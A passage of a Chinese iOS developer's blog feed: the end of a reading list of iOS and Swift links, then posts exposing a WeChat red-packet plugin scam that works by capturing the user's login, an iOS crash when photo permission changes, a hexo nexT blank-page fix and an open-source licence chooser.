<p><a href="http://casatwy.com/iosying-yong-jia-gou-tan-ben-di-chi-jiu-hua-fang-an-ji-dong-tai-bu-shu.html" target="_blank" rel="external">iOS应用架构谈 本地持久化方案及动态部署</a></p>
<p><a href="http://www.voidcn.com/blog/u012881779/article/p-4112998.html" target="_blank" rel="external">[IOS]在一个工程管理多个应用</a></p>
<p><a href="https://github.com/Draveness/iOS-Source-Code-Analyze/tree/master/contents/objc" target="_blank" rel="external">iOS-Source-Code-Analyze</a></p>
<p><a href="http://colin1994.github.io/2016/10/21/Core-Image-OverView/" target="_blank" rel="external">Core Image 你需要了解的那些事~</a></p>
<p><a href="http://colin1994.github.io/2016/10/21/Core-Image-Custom-Filter/" target="_blank" rel="external">Core Image 之自定义 Filter~</a></p>
<p><a href="http://blog.imwcl.com/2017/02/16/iOS动画进阶-手摸手教你写ShineButton动画/" target="_blank" rel="external">iOS动画进阶 - 手摸手教你写ShineButton动画</a></p>
<p><a href="http://yulingtianxia.com/blog/2017/01/16/DIY-a-simple-tow-way-list/" target="_blank" rel="external">DIY 双向滑动列表</a></p>
<p><del><a href="http://www.jianshu.com/p/51d04b7639f1" target="_blank" rel="external">Block技巧与底层解析</a></del></p>
<p><del><a href="http://www.cnblogs.com/debmzhang/p/5013540.html" target="_blank" rel="external">mysql 的密码</a></del></p>
<p><del><a href="http://stackoverflow.com/questions/1559955/host-xxx-xx-xxx-xxx-is-not-allowed-to-connect-to-this-mysql-server" target="_blank" rel="external">github 远程访问权限</a></del></p>
<p><del><a href="http://www.jianshu.com/p/74124aee3c8f" target="_blank" rel="external">2017，我的iOS进阶规划</a></del></p>
<h1 id="2016-年-3-月-1-日"><a href="#2016-年-3-月-1-日" class="headerlink" title="2016 年 3 月 1 日 +"></a>2016 年 3 月 1 日 +</h1><p><a href="http://cache.xiaomiquan.com/d6a58b9cee9b67c871ca8c0fb24a62ca4637610269df037c5756ce11f3c7c507/" target="_blank" rel="external">技术往事：改变世界的TCP/IP协议（珍贵多图、手机慎点）</a></p>
<p><del><a href="http://amztion.com/2016/12/03/uiviewcontroller-lifecycle/" target="_blank" rel="external">UIViewController 相关生命周期总结</a></del></p>
<p><del><a href="http://www.cocoachina.com/ios/20160113/14896.html" target="_blank" rel="external">iOS开发 - 事件传递响应链</a></del></p>
<p><del><a href="https://git-scm.com/" target="_blank" rel="external">git</a></del></p>
<p><a href="http://www.jianshu.com/p/d7d951a99db8" target="_blank" rel="external">ReactiveCocoa 中 RACSignal 是如何发送信号的</a></p>
<p><del><a href="http://ios.skyfox.org/route.html" target="_blank" rel="external">iOS 学习路线</a></del></p>
<p><del><a href="http://urouge.github.io/migrate-to-disqus/" target="_blank" rel="external">多说评论迁移至Disqus</a></del></p>
<p><del><a href="http://yulingtianxia.com/blog/2015/11/01/More-than-you-want-to-know-about-synchronized/" target="_blank" rel="external">关于 @synchronized，这儿比你想知道的还要多</a></del></p>
<p><a href="http://www.jianshu.com/p/ddbe44064ca4" target="_blank" rel="external">iOS 常见知识点（三）：Lock</a></p>
<h1 id="2016-年-4-月-1-日"><a href="#2016-年-4-月-1-日" class="headerlink" title="2016 年 4 月 1 日 +"></a>2016 年 4 月 1 日 +</h1><p><del><a href="http://merowing.info/2013/03/overlaying-application-version-on-top-of-your-icon/" target="_blank" rel="external">Overlaying application version on top of your icon</a></del></p>
<p><del><a href="https://my.oschina.net/leejun2005/blog/202376" target="_blank" rel="external">bash/shell 解析命令行参数工具：getopts/getopt</a></del></p>
<p><del><a href="http://liam0205.me/2016/07/30/release-your-own-app-in-Homebrew/" target="_blank" rel="external">在 Homebrew 上发布自己的 App</a></del></p>
<p><a href="https://mp.weixin.qq.com/s?__biz=MjM5MDE0Mjc4MA==&amp;mid=2650995856&amp;idx=1&amp;sn=7c62704384405868ce9f28359c7306ea&amp;chksm=bdbf04c38ac88dd5f967d020546e881ab301f7951458ad7d89bd44679133e7459bf27d6a0253&amp;mpshare=1&amp;scene=1&amp;srcid=0414Rx8W3W2yfoCQqgmTnGFH&amp;key=2a91529dae94444b304cab6ecab61d94479bfd3b891b378a875d1eab3f49c7b444f4c608405217ef464212c23e9c0c3b57b43b1c231f5e0f4c501c63927cbd8812163d7b3748a222f63581ed2d96b078&amp;ascene=0&amp;uin=MjIyOTk0ODU0MQ%3D%3D&amp;devicetype=iMac+MacBookPro12%2C1+OSX+OSX+10.12.4+build(16E195" target="_blank" rel="external">左耳朵耗子：拖累开发团队效率的困局与解决之道</a>&amp;version=12020110&amp;nettype=WIFI&amp;fontScale=100&amp;pass_ticket=bavrh4luffwXtPNqc9c46%2Fsos7wDPNF15zzHV8kiC6imiFomM3lu8kQ9H3AY1%2BWJ)</p>
<p><a href="http://tech.meituan.com/SharkSDK.html" target="_blank" rel="external">美团点评移动网络优化实践</a></p>
<p><a href="http://www.cnblogs.com/Jenaral/p/5530383.html?from=groupmessage&amp;isappinstalled=1" target="_blank" rel="external">静态库与动态库的区别</a></p>
<p><del><a href="https://mp.weixin.qq.com/s?__biz=MzA3ODg4MDk0Ng==&amp;mid=2651113202&amp;idx=1&amp;sn=61bdbf35b49168d2373547887286a097&amp;chksm=844c6f2fb33be6399cbc05e679322ffc0ee89268f458f7bf47ab67e5561dd1f82b06849a2c81&amp;mpshare=1&amp;scene=23&amp;srcid=0417YjEuAcWp0SxCLrrxnyBU#rd" target="_blank" rel="external">基于ReSwift和App Coordinator的iOS架构</a></del></p>
<p><del><a href="http://www.jianshu.com/p/67a6004f6930" target="_blank" rel="external">组件化架构漫谈</a></del></p>
<p><del><a href="http://blog.cnbang.net/tech/3080/" target="_blank" rel="external">iOS 组件化方案探索</a></del></p>
<p><del><a href="https://casatwy.com/iOS-Modulization.html" target="_blank" rel="external">iOS应用架构谈 组件化方案</a></del></p>
<p><del><a href="https://github.com/meili/MGJRouter" target="_blank" rel="external">MGJRouter</a></del></p>
<p><del><a href="http://mrpeak.cn/blog/module/" target="_blank" rel="external">iOS组件化方案</a></del></p>
<p><strong> Swift 编译速度 </strong></p>
<ol>
<li><p><del><a href="http://www.jianshu.com/p/36cc0af43258" target="_blank" rel="external">Swift build time</a></del></p>
</li>
<li><p><del><a href="http://www.cnblogs.com/YungMing/p/5160346.html" target="_blank" rel="external">分析Swift项目的编译时间</a></del></p>
</li>
<li><p><del><a href="http://www.jianshu.com/p/9825749efa8b" target="_blank" rel="external">调整代码, 加速swift编译</a></del></p>
</li>
<li><p><del><a href="http://www.neroblog.com/?p=19" target="_blank" rel="external">关于Swift编译慢并没什么卵用的解决办法</a></del></p>
</li>
<li><p><del><a href="https://github.com/RobertGummesson/BuildTimeAnalyzer-for-Xcode" target="_blank" rel="external">BuildTimeAnalyzer-for-Xcode</a></del></p>
</li>
</ol>
<p><del><a href="http://mobilists.eleme.io/" target="_blank" rel="external">Eleme Mobilists</a></del></p>
<p><a href="https://news.realm.io/cn/news/nate-cook-tryswift-tokyo-unsafe-swift-and-pointer-types/?from=groupmessage&amp;isappinstalled=1" target="_blank" rel="external">Swift 皇冠上的明珠：不安全的 Swift 和指针类型</a></p>
<p><a href="http://www.jianshu.com/p/b8eae0e4de43#" target="_blank" rel="external">写一个带有“两级缓存”的网络请求库</a></p>
<p><del><a href="http://www.jianshu.com/p/965df0f28014" target="_blank" rel="external">GPUImage详细解析（七）文字水印和动态图像水印</a></del></p>
<p><del><a href="https://www.eyrefree.org/2017/05/01/2017-05-01-GitHub-Badge-Introduction/" target="_blank" rel="external">GitHub 项目徽章的添加和设置</a></del></p>
<h1 id="2016-年-5-月-1-日"><a href="#2016-年-5-月-1-日" class="headerlink" title="2016 年 5 月 1 日 +"></a>2016 年 5 月 1 日 +</h1><p><del><a href="http://www.hudongdong.com/ios/530.html" target="_blank" rel="external">GPUImage录像的一些备忘</a></del></p>
<p><del><a href="https://juejin.im/post/5905b9058d6d810058d49f0d" target="_blank" rel="external">优化 Swift 编译速度</a></del></p>
<p><del><a href="https://medium.com/@pvzig/building-slack-bots-in-swift-b99e243e444c" target="_blank" rel="external">Building Slack Bots In Swift</a></del></p>
<p><a href="http://www.jianshu.com/p/5c3f19c78f25" target="_blank" rel="external">程序员拿什么来学英语</a></p>
<p><a href="http://ios.jobbole.com/93179/" target="_blank" rel="external">Xcode 自定义模板实践</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;2016-年-1-月-1-日&quot;&gt;&lt;a href=&quot;#2016-年-1-月-1-日&quot; class=&quot;headerlink&quot; title=&quot;2016 年 1 月 1 日 +&quot;&gt;&lt;/a&gt;2016 年 1 月 1 日 +&lt;/h1&gt;&lt;p&gt;有关 objc_autoreleasereturnvalue&lt;/p&gt;
&lt;p&gt;&lt;del&gt;&lt;a href=&quot;http://www.voidcn.com/blog/li15809284891/article/p-6244162.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;iOS 自动释放池ARC与MRC&lt;/a&gt;&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;&lt;a href=&quot;http://blog.sunnyxx.com/2014/10/15/behind-autorelease/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;黑幕背后的Autorelease&lt;/a&gt;&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;&lt;del&gt;&lt;a href=&quot;http://clang.llvm.org/docs/AutomaticReferenceCounting.html#arc-runtime-objc-autoreleasereturnvalue&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;Clang 4.0 documentation&lt;/a&gt;&lt;/del&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Other" scheme="http://zhoulingyu.com/categories/Other/"/>
    
      <category term="阅读列表" scheme="http://zhoulingyu.com/categories/Other/%E9%98%85%E8%AF%BB%E5%88%97%E8%A1%A8/"/>
    
    
      <category term="Other" scheme="http://zhoulingyu.com/tags/Other/"/>
    
      <category term="ReadList" scheme="http://zhoulingyu.com/tags/ReadList/"/>
    
  </entry>
  
  <entry>
    <title>关于微信自动抢红包骗局</title>
    <link href="http://zhoulingyu.com/2016/11/21/%E5%85%B3%E4%BA%8E%E5%BE%AE%E4%BF%A1%E8%87%AA%E5%8A%A8%E6%8A%A2%E7%BA%A2%E5%8C%85%E9%AA%97%E5%B1%80/"/>
    <id>http://zhoulingyu.com/2016/11/21/关于微信自动抢红包骗局/</id>
    <published>2016-11-21T17:16:03.000Z</published>
    <updated>2017-05-15T02:48:26.479Z</updated>
    
    <content type="html"><![CDATA[<h1 id="事出起因"><a href="#事出起因" class="headerlink" title="事出起因"></a>事出起因</h1><p>前几天，大学同学发给我一个<a href="https://a.meipian.cn/8kbmkn5" target="_blank" rel="external">链接</a>，里面是一个微信抢红包插件的介绍。大致的样子在文末给出。大致是买他们的插件可以通过他们的平台绑定微信号，设定自动抢红包并且设定抢红包的延迟（比如 100 ms）什么的。</p>
<p>之前我在研究 iOS 攻防的时候研究过微信的红包插件。但是从原理上来说，是通过动态链接库为微信插入了自己加入的代码（在收到红包类型信息时，调用拆开红包方法）再通过重签名进行打包。从道德上，也是为了研究 iOS 的攻防的一些知识。当我收到同学的链接时，第一个反应是，居然有人卖这个，简直不合情理。</p>
<a id="more"></a>
<h1 id="微信自动抢红包的原理"><a href="#微信自动抢红包的原理" class="headerlink" title="微信自动抢红包的原理"></a>微信自动抢红包的原理</h1><p>仔细观看了<a href="https://a.meipian.cn/8kbmkn5" target="_blank" rel="external">链接</a>文章内的介绍，感觉非常的不可思议， 大家也可以在文末或者链接中查看。文章中介绍到，在他们的平台注册一个账号，让后再填写微信号码和从他们客服那里买来的激活码，就会成功注册并返回给你一张二维码，只要你扫描了二维码就可以自动抢红包了。并且是 24 小时关机状态都可以抢红包。</p>
<p>在一开始，我觉得非常不可意思。首先，我们之前接触到的红包插件，实质上是对微信 app 代码的改变。如果是通过第三方平台可以实现抢红包的话，首先：</p>
<ol>
<li>拥有抢红包的 api</li>
<li>拿到用户的登陆状态。</li>
</ol>
<p>不仅如此，及时这两点都能做到，还必须要能拦截到红包消息，但是微信的 IM 协议应该是 HTTP 的协议扩展，建立的是长连接。在应用处于前台时，通过 HTTP 扩展协议获取信息，在后台时，通过苹果 APNS 协议获取信息。到底是怎么样做到信息拦截的呢。</p>
<p>在和同事又仔细查阅一番后，<a href="http://www.jianshu.com/users/86344ec5bfe7/latest_articles" target="_blank" rel="external">赵鲜华</a>同学首先发现了问题的关键所在。就是下图：</p>
<p><img src="http://static2.ivwen.com/users/6206370/c88810a066354895a60fb3bdea77190e.jpg-mobile" alt=""></p>
<p>这张图片给出的二维码，在鲜华同学扫描过后发现是电脑登陆微信时，微信给出的『手机扫一扫登陆二维码』。并且图片中也指出需要『用微信识别二维码登陆即可』。</p>
<p>那么现在真相显而易见。<strong>实质上，是通过他人登陆你的微信，然后在 PC 端做一些手脚，实现自动抢红包。</strong></p>
<p>这种自动抢红包的实现方案，<strong>不仅会让你的红包消息泄露，也会让你的所有聊天信息全部被暴露</strong>。毕竟你是在他人电脑上直接登陆了微信。</p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>根据我大学同学的描述，这种红包插件在淘宝上售出，有人评价『用几次就不能用了』。说到底，也许对方根本不是想赚你的插件钱，也许就是想获取他人的隐私信息。</p>
<p>所以对于这种骗局，本人表示不能容忍，特写词文章分享，希望大家不要上当受骗。</p>
<p>如果想研究 iOS 的攻防，希望你也只用于研究学习。</p>
<h1 id="相关图片"><a href="#相关图片" class="headerlink" title="相关图片"></a>相关图片</h1><p><img src="http://static2.ivwen.com/users/6206370/2cf8d283f6eb4deaa0a2be90dc3e500c.jpg-mobile" alt=""></p>
<p><img src="http://static2.ivwen.com/users/6206370/b0e3afc444c94b879bf6f08d0219444c.jpg-mobile" alt=""></p>
<p><img src="http://static2.ivwen.com/users/6206370/f0260abf60c740b89763ca0245354536.jpg-mobile" alt=""></p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我 <a href="&#109;&#97;&#x69;&#x6c;&#x74;&#x6f;&#58;&#x63;&#111;&#100;&#x65;&#114;&#102;&#x69;&#115;&#104;&#x40;&#x31;&#54;&#51;&#x2e;&#x63;&#x6f;&#109;">&#x63;&#111;&#100;&#x65;&#114;&#102;&#x69;&#115;&#104;&#x40;&#x31;&#54;&#51;&#x2e;&#x63;&#x6f;&#109;</a>。</p>
<p>博主是 iOS 妹子一枚。</p>
<p>希望大家一起进步。</p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;事出起因&quot;&gt;&lt;a href=&quot;#事出起因&quot; class=&quot;headerlink&quot; title=&quot;事出起因&quot;&gt;&lt;/a&gt;事出起因&lt;/h1&gt;&lt;p&gt;前几天，大学同学发给我一个&lt;a href=&quot;https://a.meipian.cn/8kbmkn5&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;链接&lt;/a&gt;，里面是一个微信抢红包插件的介绍。大致的样子在文末给出。大致是买他们的插件可以通过他们的平台绑定微信号，设定自动抢红包并且设定抢红包的延迟（比如 100 ms）什么的。&lt;/p&gt;
&lt;p&gt;之前我在研究 iOS 攻防的时候研究过微信的红包插件。但是从原理上来说，是通过动态链接库为微信插入了自己加入的代码（在收到红包类型信息时，调用拆开红包方法）再通过重签名进行打包。从道德上，也是为了研究 iOS 的攻防的一些知识。当我收到同学的链接时，第一个反应是，居然有人卖这个，简直不合情理。&lt;/p&gt;
    
    </summary>
    
      <category term="随笔" scheme="http://zhoulingyu.com/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="随笔" scheme="http://zhoulingyu.com/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>iOS——改变相册访问许可时的 crash</title>
    <link href="http://zhoulingyu.com/2016/11/17/iOS%E2%80%94%E2%80%94%E6%94%B9%E5%8F%98%E7%9B%B8%E5%86%8C%E8%AE%BF%E9%97%AE%E8%AE%B8%E5%8F%AF%E6%97%B6-crash-%E9%97%AE%E9%A2%98/"/>
    <id>http://zhoulingyu.com/2016/11/17/iOS——改变相册访问许可时-crash-问题/</id>
    <published>2016-11-17T14:39:25.000Z</published>
    <updated>2017-05-15T02:48:26.479Z</updated>
    
    <content type="html"><![CDATA[<h1 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h1><p>这几天有注意到一个问题。我在做相册一块的时候，如果用户没有打开相册访问权限，会跳转到系统的设置界面，接着如果改动了权限回到 app，就会发现 app crash 了，并且重新加载了。</p>
<p>大概的步骤如下：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E6%94%B9%E5%8F%98%E7%9B%B8%E5%86%8C%E8%AE%BF%E9%97%AE%E8%AE%B8%E5%8F%AF%E6%97%B6%20crash%20%E9%97%AE%E9%A2%98-01.PNG-w375" alt=""></p>
<p>点击设置后代码如下：</p>
<a id="more"></a>
<figure class="highlight objc"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">[[<span class="built_in">UIApplication</span> sharedApplication] openURL:[<span class="built_in">NSURL</span> URLWithString:<span class="built_in">UIApplicationOpenSettingsURLString</span>]];</div></pre></td></tr></table></figure>
<p>成功跳转后：<br><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E6%94%B9%E5%8F%98%E7%9B%B8%E5%86%8C%E8%AE%BF%E9%97%AE%E8%AE%B8%E5%8F%AF%E6%97%B6%20crash%20%E9%97%AE%E9%A2%98-02.png-w375" alt=""></p>
<p>改变一下照片权限。</p>
<p>然后华丽丽的 crash 了：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E6%94%B9%E5%8F%98%E7%9B%B8%E5%86%8C%E8%AE%BF%E9%97%AE%E8%AE%B8%E5%8F%AF%E6%97%B6%20crash%20%E9%97%AE%E9%A2%98-03.png" alt=""></p>
<p>没有任何输出，没有被 All Exceptions 断点拦截到。这真是一个悲伤的故事。</p>
<h1 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h1><p>当我发现这个问题时，仔细观察发现这种 crash 和一般的 crash 不太一样，app 会自动重启，但是没有经过 LauchScreen 界面。</p>
<p>然后尝试去用『大众点评』、『支付宝』一类常用的 app 做了同样的尝试。发现均有此问题。</p>
<p>又经过一番查找，在 <strong>stackoverflow</strong> 上找到 <a href="http://stackoverflow.com/questions/25611537/how-to-detect-changes-to-phauthorizationstatus" target="_blank" rel="external">这样</a> 一个问题，该问下有这样的一个回答。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E6%94%B9%E5%8F%98%E7%9B%B8%E5%86%8C%E8%AE%BF%E9%97%AE%E8%AE%B8%E5%8F%AF%E6%97%B6%20crash%20%E9%97%AE%E9%A2%98-04.png" alt=""></p>
<p>该问题无人解答，这真是一个悲伤的故事。</p>
<p>随后又发现 <a href="http://stackoverflow.com/questions/26115265/app-crashes-on-enabling-camera-access-from-settings-ios-8/" target="_blank" rel="external">这样</a> 一个问题——<strong>App crashes on enabling Camera Access from Settings iOS 8</strong>。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E6%94%B9%E5%8F%98%E7%9B%B8%E5%86%8C%E8%AE%BF%E9%97%AE%E8%AE%B8%E5%8F%AF%E6%97%B6%20crash%20%E9%97%AE%E9%A2%98-05.png" alt=""></p>
<p>当首次请求访问相册时，系统会自动提示你在 plist 文件中配置的请求许可信息。<br>无论用户是否允许你的 app 访问相册，如果用户跳出应用改变了通讯簿、日历、提醒、相册的许可开关。iOS 将会 <code>SIGKILL（无条件终止）</code> 你的 app，以便确保你的 app 不再拿到任何过时的授权信息。当用户回到你的 app 时，你的 app 将重新加载。</p>
<p>综上所述，这是一个可以放任它不用管的问题。这果然是个悲伤的故事。</p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我 <a href="&#109;&#x61;&#x69;&#108;&#x74;&#111;&#x3a;&#x63;&#111;&#100;&#x65;&#114;&#102;&#105;&#115;&#x68;&#x40;&#x31;&#54;&#51;&#x2e;&#99;&#111;&#x6d;">&#x63;&#111;&#100;&#x65;&#114;&#102;&#105;&#115;&#x68;&#x40;&#x31;&#54;&#51;&#x2e;&#99;&#111;&#x6d;</a>。</p>
<p>博主是 iOS 妹子一枚。</p>
<p>希望大家一起进步。</p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;问题描述&quot;&gt;&lt;a href=&quot;#问题描述&quot; class=&quot;headerlink&quot; title=&quot;问题描述&quot;&gt;&lt;/a&gt;问题描述&lt;/h1&gt;&lt;p&gt;这几天有注意到一个问题。我在做相册一块的时候，如果用户没有打开相册访问权限，会跳转到系统的设置界面，接着如果改动了权限回到 app，就会发现 app crash 了，并且重新加载了。&lt;/p&gt;
&lt;p&gt;大概的步骤如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xt4xp.com1.z0.glb.clouddn.com/blog_iOS%E2%80%94%E2%80%94%E6%94%B9%E5%8F%98%E7%9B%B8%E5%86%8C%E8%AE%BF%E9%97%AE%E8%AE%B8%E5%8F%AF%E6%97%B6%20crash%20%E9%97%AE%E9%A2%98-01.PNG-w375&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;点击设置后代码如下：&lt;/p&gt;
    
    </summary>
    
      <category term="iOS" scheme="http://zhoulingyu.com/categories/iOS/"/>
    
    
      <category term="iOS" scheme="http://zhoulingyu.com/tags/iOS/"/>
    
  </entry>
  
  <entry>
    <title>近日关于 hexo 主题 nexT 博客加载空白问题</title>
    <link href="http://zhoulingyu.com/2016/11/07/%E5%85%B3%E4%BA%8Ehexo%E4%B8%BB%E9%A2%98nexT%E5%8D%9A%E5%AE%A2%E5%8A%A0%E8%BD%BD%E7%A9%BA%E7%99%BD%E9%97%AE%E9%A2%98/"/>
    <id>http://zhoulingyu.com/2016/11/07/关于hexo主题nexT博客加载空白问题/</id>
    <published>2016-11-07T12:42:43.000Z</published>
    <updated>2017-05-15T02:48:26.479Z</updated>
    
    <content type="html"><![CDATA[<p>周末的时候，突然收到了一些邮件以及知乎的私信，告诉我我的博客似乎挂了。</p>
<p>今天查看的时候，发现确实出现了大片的空白。</p>
<p>以下是排查步骤。</p>
<h3 id="1-用-Chrome-的开发者工具中的-Network-选项查看"><a href="#1-用-Chrome-的开发者工具中的-Network-选项查看" class="headerlink" title="1. 用 Chrome 的开发者工具中的 Network 选项查看"></a>1. 用 Chrome 的开发者工具中的 Network 选项查看</h3><p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E5%85%B3%E4%BA%8E%20hexo%20%E4%B8%BB%E9%A2%98%20nexT%20%E5%8D%9A%E5%AE%A2%E5%8A%A0%E8%BD%BD%E7%A9%BA%E7%99%BD%E9%97%AE%E9%A2%98-01.png" alt=""></p>
<a id="more"></a>
<p>发现很多 js 都加载失败，在加载失败的 js 右键 <code>Open Link in New Tab</code> 打开，发现返回 Github 的 404 页面。</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E5%85%B3%E4%BA%8E%20hexo%20%E4%B8%BB%E9%A2%98%20nexT%20%E5%8D%9A%E5%AE%A2%E5%8A%A0%E8%BD%BD%E7%A9%BA%E7%99%BD%E9%97%AE%E9%A2%98-02.png" alt=""></p>
<p>访问失败的都是 <code>vendors</code> 目录下的资源。</p>
<blockquote>
<p>其实我前端工具用的很不熟，这里隆重感谢<a href="http://www.jianshu.com/users/86344ec5bfe7/latest_articles" target="_blank" rel="external">赵鲜华</a>同学的热心帮助。</p>
</blockquote>
<h3 id="2-查看-Github-博客的-repo"><a href="#2-查看-Github-博客的-repo" class="headerlink" title="2.查看 Github 博客的 repo"></a>2.查看 Github 博客的 repo</h3><p>查看 Github 博客的 repo，发现文件确实是存在的。</p>
<p>Travis-CI 也是正常构建的。</p>
<h3 id="3-翻阅-nexT-主题-isusses"><a href="#3-翻阅-nexT-主题-isusses" class="headerlink" title="3. 翻阅 nexT 主题 isusses"></a>3. 翻阅 nexT 主题 isusses</h3><p> 最终在 isusse 中找到了原因。</p>
<p> GitHub Pages 禁止了 source/vendors 目录的访问。其原因是 Github 在 11 月 3 日更新了版本。其中包括升级了 Jekyll 到 3.3。Jekyll 为了加快构建速度，忽略 vendor 和 node_modules 文件夹。更新日志在<a href="https://github.com/blog/2277-what-s-new-in-github-pages-with-jekyll-3-3" target="_blank" rel="external">这里</a></p>
<p> <img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E5%85%B3%E4%BA%8E%20hexo%20%E4%B8%BB%E9%A2%98%20nexT%20%E5%8D%9A%E5%AE%A2%E5%8A%A0%E8%BD%BD%E7%A9%BA%E7%99%BD%E9%97%AE%E9%A2%98-04.png" alt=""></p>
<p><a href="https://github.com/iissnan/hexo-theme-next/issues/1214" target="_blank" rel="external">这是解决问题的 isusse</a>。</p>
<p>关键处如下：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E5%85%B3%E4%BA%8E%20hexo%20%E4%B8%BB%E9%A2%98%20nexT%20%E5%8D%9A%E5%AE%A2%E5%8A%A0%E8%BD%BD%E7%A9%BA%E7%99%BD%E9%97%AE%E9%A2%98-03.png" alt=""></p>
<p>除了手动解决方法之外，可以通过在 nexT 主题目录下，<code>git pull</code> 更新。</p>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我 <a href="&#109;&#x61;&#105;&#x6c;&#116;&#x6f;&#x3a;&#99;&#x6f;&#x64;&#x65;&#x72;&#x66;&#105;&#115;&#104;&#64;&#49;&#54;&#51;&#x2e;&#x63;&#x6f;&#x6d;">&#99;&#x6f;&#x64;&#x65;&#x72;&#x66;&#105;&#115;&#104;&#64;&#49;&#54;&#51;&#x2e;&#x63;&#x6f;&#x6d;</a>。</p>
<p>博主是 iOS 妹子一枚。</p>
<p>希望大家一起进步。</p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;周末的时候，突然收到了一些邮件以及知乎的私信，告诉我我的博客似乎挂了。&lt;/p&gt;
&lt;p&gt;今天查看的时候，发现确实出现了大片的空白。&lt;/p&gt;
&lt;p&gt;以下是排查步骤。&lt;/p&gt;
&lt;h3 id=&quot;1-用-Chrome-的开发者工具中的-Network-选项查看&quot;&gt;&lt;a href=&quot;#1-用-Chrome-的开发者工具中的-Network-选项查看&quot; class=&quot;headerlink&quot; title=&quot;1. 用 Chrome 的开发者工具中的 Network 选项查看&quot;&gt;&lt;/a&gt;1. 用 Chrome 的开发者工具中的 Network 选项查看&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E5%85%B3%E4%BA%8E%20hexo%20%E4%B8%BB%E9%A2%98%20nexT%20%E5%8D%9A%E5%AE%A2%E5%8A%A0%E8%BD%BD%E7%A9%BA%E7%99%BD%E9%97%AE%E9%A2%98-01.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Other" scheme="http://zhoulingyu.com/categories/Other/"/>
    
    
      <category term="Other" scheme="http://zhoulingyu.com/tags/Other/"/>
    
  </entry>
  
  <entry>
    <title>自制开源许可证快速选择</title>
    <link href="http://zhoulingyu.com/2016/10/28/%E5%BC%80%E6%BA%90%E8%AE%B8%E5%8F%AF%E8%AF%81%E5%BF%AB%E9%80%9F%E9%80%89%E6%8B%A9/"/>
    <id>http://zhoulingyu.com/2016/10/28/开源许可证快速选择/</id>
    <published>2016-10-28T14:08:41.000Z</published>
    <updated>2017-05-15T02:48:26.483Z</updated>
    
    <content type="html"><![CDATA[<p>有的时候，在 Github 新建项目选择开源许可证是不是很困扰？查阅了资料了以后，大篇的文字也让你看的头晕眼花？</p>
<p>阮一峰前辈在<a href="http://www.ruanyifeng.com/blog/2011/05/how_to_choose_free_software_licenses.html" target="_blank" rel="external">博客</a>中给出了<a href="http://paulmillr.com/posts/simple-description-of-popular-software-licenses/" target="_blank" rel="external">Paul Miller</a>绘制图片的中文版，但是感觉略有不同，下面给出我画的开源许可证快速选择图片。</p>
<p>一目了然：</p>
<p><img src="http://7xt4xp.com1.z0.glb.clouddn.com/blog_%E5%BC%80%E6%BA%90%E8%AE%B8%E5%8F%AF%E8%AF%81%E5%BF%AB%E9%80%9F%E9%80%89%E6%8B%A9.png" alt="开源许可证快速选择"></p>
<a id="more"></a>
<hr>
<p>有什么问题都可以在博文后面留言，或者微博上私信我，或者邮件我 <a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#x3a;&#99;&#x6f;&#x64;&#101;&#114;&#x66;&#x69;&#x73;&#x68;&#x40;&#49;&#54;&#x33;&#46;&#x63;&#111;&#x6d;">&#99;&#x6f;&#x64;&#101;&#114;&#x66;&#x69;&#x73;&#x68;&#x40;&#49;&#54;&#x33;&#46;&#x63;&#111;&#x6d;</a>。</p>
<p>博主是 iOS 妹子一枚。</p>
<p>希望大家一起进步。</p>
<p>我的微博：<a href="http://weibo.com/coderfish/" target="_blank" rel="external">小鱼周凌宇</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;有的时候，在 Github 新建项目选择开源许可证是不是很困扰？查阅了资料了以后，大篇的文字也让你看的头晕眼花？&lt;/p&gt;
